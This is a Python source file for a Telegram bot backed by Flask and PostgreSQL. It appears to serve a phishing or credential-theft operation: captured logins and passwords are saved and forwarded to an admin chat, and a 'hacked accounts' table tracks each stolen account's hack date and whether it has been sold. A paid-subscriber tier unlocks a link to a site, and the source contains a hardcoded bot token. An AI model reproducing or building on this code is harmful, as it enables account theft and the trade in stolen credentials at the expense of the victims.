from flask import Flask, request
import telebot
from telebot import types
import os
import psycopg2
from datetime import datetime, timedelta

# Налаштування
TOKEN = '8028944732:AAH992DI-fMd3OSjfqfs4pEa3J04Jwb48Q4'
ADMIN_CHAT_ID = '6956377285'
DATABASE_URL = os.getenv('DATABASE_URL')
SITE_URL = os.getenv('SITE_URL', 'https://your-web-app.onrender.com')

app = Flask(__name__)
bot = telebot.TeleBot(TOKEN)

def get_db_connection():
    return psycopg2.connect(DATABASE_URL)

def init_db():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS users (
            chat_id TEXT PRIMARY KEY,
            prefix TEXT NOT NULL,
            subscription_end TIMESTAMP NOT NULL
        )
    ''')
    cur.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            login TEXT PRIMARY KEY,
            password TEXT NOT NULL,
            added_time TIMESTAMP NOT NULL
        )
    ''')
    cur.execute('''
        CREATE TABLE IF NOT EXISTS hacked_accounts (
            login TEXT PRIMARY KEY,
            password TEXT NOT NULL,
            hack_date TIMESTAMP NOT NULL,
            prefix TEXT NOT NULL,
            sold_status TEXT NOT NULL,
            linked_chat_id TEXT
        )
    ''')
    conn.commit()
    cur.close()
    conn.close()

def get_user(chat_id):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT prefix, subscription_end FROM users WHERE chat_id = %s", (chat_id,))
    user = cur.fetchone()
    cur.close()
    conn.close()
    return {'prefix': user[0], 'subscription_end': user[1]} if user else None

def save_user(chat_id, prefix, subscription_end):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
                (chat_id, prefix, subscription_end, prefix, subscription_end))
    conn.commit()
    cur.close()
    conn.close()

def delete_user(chat_id):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("DELETE FROM users WHERE chat_id = %s", (chat_id,))
    conn.commit()
    cur.close()
    conn.close()

def save_credential(login, password):
    added_time = datetime.now()
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO credentials (login, password, added_time) VALUES (%s, %s, %s) ON CONFLICT (login) DO UPDATE SET password = %s, added_time = %s",
                (login, password, added_time, password, added_time))
    conn.commit()
    cur.close()
    conn.close()
    bot.send_message(ADMIN_CHAT_ID, f"🔐 Новый логин:\nЛогин: {login}\nПароль: {password}")

def get_all_credentials():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT login, password, added_time FROM credentials")
    credentials = cur.fetchall()
    cur.close()
    conn.close()
    current_time = datetime.now()
    valid_credentials = []
    for login, password, added_time in credentials:
        if (current_time - added_time).days <= 7:
            valid_credentials.append((login, password, added_time))
        else:
            delete_credential(login)
    return valid_credentials

def delete_credential(login):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("DELETE FROM credentials WHERE login = %s", (login,))
    conn.commit()
    cur.close()
    conn.close()

def save_hacked_account(login, password, prefix="Взломан", sold_status="Не продан", linked_chat_id=None):
    hack_date = datetime.now()
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id) VALUES (%s, %s, %s, %s, %s, %s) ON CONFLICT (login) DO UPDATE SET password = %s, hack_date = %s, prefix = %s, sold_status = %s, linked_chat_id = %s",
                (login, password, hack_date, prefix, sold_status, linked_chat_id, password, hack_date, prefix, sold_status, linked_chat_id))
    conn.commit()
    cur.close()
    conn.close()

def get_all_hacked_accounts():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT login, password, hack_date, prefix, sold_status, linked_chat_id FROM hacked_accounts")
    accounts = cur.fetchall()
    cur.close()
    conn.close()
    return [{'login': acc[0], 'password': acc[1], 'hack_date': acc[2], 'prefix': acc[3], 'sold_status': acc[4], 'linked_chat_id': acc[5]} for acc in accounts]

def delete_hacked_account(login):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("DELETE FROM hacked_accounts WHERE login = %s", (login,))
    conn.commit()
    cur.close()
    conn.close()

def clear_old_credentials():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("DELETE FROM credentials WHERE added_time < %s", (datetime.now() - timedelta(days=7),))
    deleted = cur.rowcount
    conn.commit()
    cur.close()
    conn.close()
    return deleted

def get_all_users():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT chat_id, prefix, subscription_end FROM users")
    users = cur.fetchall()
    cur.close()
    conn.close()
    return [{'chat_id': u[0], 'prefix': u[1], 'subscription_end': u[2]} for u in users]

def is_admin(chat_id):
    if str(chat_id) == ADMIN_CHAT_ID:
        return True
    user = get_user(str(chat_id))
    return user and user['prefix'] == 'Админ'

@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return 'OK', 200
    return 'Invalid request', 400

@app.route('/setup', methods=['GET'])
def setup_webhook():
    bot.remove_webhook()
    webhook_url = f"https://{os.getenv('RENDER_EXTERNAL_HOSTNAME')}/webhook"
    bot.set_webhook(url=webhook_url)
    init_db()
    return "Webhook set", 200

@bot.message_handler(commands=['start'])
def start_cmd(message):
    chat_id = str(message.chat.id)
    if not get_user(chat_id):
        save_user(chat_id, 'Посетитель', datetime.now())
    bot.reply_to(message, "✅ Бот активен. Используйте /menu для информации.")

@bot.message_handler(commands=['menu'])
def menu_cmd(message):
    user = get_user(str(message.chat.id))
    if not user:
        bot.reply_to(message, "Вы не зарегистрированы!")
        return
    time_left = user['subscription_end'] - datetime.now()
    time_str = f"{time_left.days} дней" if time_left.total_seconds() > 0 else "Подписка истекла"
    bot.reply_to(message, f"🧾 Ваш статус:\nПрефикс: {user['prefix']}\nПодписка: {time_str}")

@bot.message_handler(commands=['site'])
def site_cmd(message):
    user = get_user(str(message.chat.id))
    if not user or user['prefix'] == 'Посетитель':
        bot.reply_to(message, "🔒 Доступно только для подписчиков!")
        return
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Перейти на сайт", url=SITE_URL))
    bot.reply_to(message, "🌐 Нажмите кнопку ниже:", reply_markup=markup)

@bot.message_handler(commands=['hacked'])
def hacked_cmd(message):
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if not args:
        accounts = get_all_hacked_accounts()
        if not accounts:
            bot.reply_to(message, "📭 Список взломанных аккаунтов пуст!")
            return
        response = "📋 Список взломанных аккаунтов:\n\n"
        for acc in accounts:
            response += (f"Логин: {acc['login']}\nПароль: {acc['password']}\n"
                        f"Дата взлома: {acc['hack_date'].strftime('%Y-%m-%d %H:%M')}\n"
                        f"Префикс: {acc['prefix']}\nСтатус: {acc['sold_status']}\n"
                        f"Привязка: {acc['linked_chat_id'] or 'Нет'}\n\n")
        if len(response) > 4096:
            parts = [response[i:i+4096] for i in range(0, len(response), 4096)]
            for part in parts:
                bot.reply_to(message, part)
        else:
            bot.reply_to(message, response)
        return
    if args[0] == "add" and len(args) >= 3:
        login, password = args[1], args[2]
        prefix = args[3] if len(args) > 3 else "Взломан"
        sold_status = args[4] if len(args) > 4 else "Не продан"
        linked_chat_id = args[5] if len(args) > 5 else None
        save_hacked_account(login, password, prefix, sold_status, linked_chat_id)
        bot.reply_to(message, f"✅ Аккаунт {login} добавлен в список взломанных!")
    elif args[0] == "delete" and len(args) == 2:
        login = args[1]
        delete_hacked_account(login)
        bot.reply_to(message, f"✅ Аккаунт {login} удален из списка взломанных!")

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
